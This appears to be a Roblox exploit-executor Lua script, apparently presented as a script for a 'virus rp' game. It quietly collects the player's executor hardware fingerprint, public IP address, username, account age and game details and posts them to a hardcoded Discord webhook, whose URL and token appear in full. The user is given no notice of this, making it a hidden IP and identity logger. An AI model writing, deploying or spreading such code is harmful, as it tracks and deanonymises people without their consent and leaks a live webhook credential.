function makereport()
	if (not http_request) then
        return game:GetService('Players').LocalPlayer:Kick('Unable to find proper request function')
    end

    -- // define hash function
end

plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)

local http_request = http_request
if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200,
            Body = request(tb.Url, tb.Method, (tb.Body or ''))
        }
    end
end

local body = http_request({Url = 'https://httpbin.org/get', Method = 'GET'}).Body
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"}
hwid = ""

for i, v in next, hwid_list do
    if decoded.headers[v] then
        hwid = decoded.headers[v]
        break
    end
end
local IP = game:HttpGet("https://v4.ident.me")
if hwid then
    local HttpServ = game:GetService('HttpService')
    local url = "https://discord.com/api/webhooks/1331574255208370217/8WsGcQ-MDCdTod2QnMPJv0PrA7WLu6PTeh-ikzrIYWQpMPa5CX_tkLB3wrjPQ3MlBZNe"

    local data =
    {
        ["content"] = "LLL",
        ["embeds"] = {{
            ["title"] = "**Player Executed Best Script ever for virus rp**",
            ["description"] = hwid,
            ["type"] = "rich",
            ["color"] = tonumber(0x33FF5C),
            ["fields"] = {
                {
                    ["name"] = "Username:",
                    ["value"] = Game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "IP Address:",
                    ["value"] = IP,
                    ["inline"] = true
                },
                {
                    ["name"] = "Game Link:",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                    ["inline"] = true
                },
                {
                    ["name"] = "Game Name:",
                    ["value"] = info.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Age:",
                    ["value"] = plr.AccountAge,
                    ["inline"] = true
                },
                {
                    ["name"] = "Premium:",
                    ["value"] = premium,
                    ["inline"] = true
                },
                {
                    ["name"] = "ALT:",
                    ["value"] = ALT,
                    ["inline"] = true
                },
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)

    local headers = {
        ["content-type"] = "application/json"
    }

    local request_payload = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    http_request(request_payload)
    setclipboard(hwid)
else
    game:GetService("Players").LocalPlayer:Kick('Unable to find HWID! Contact support.')
end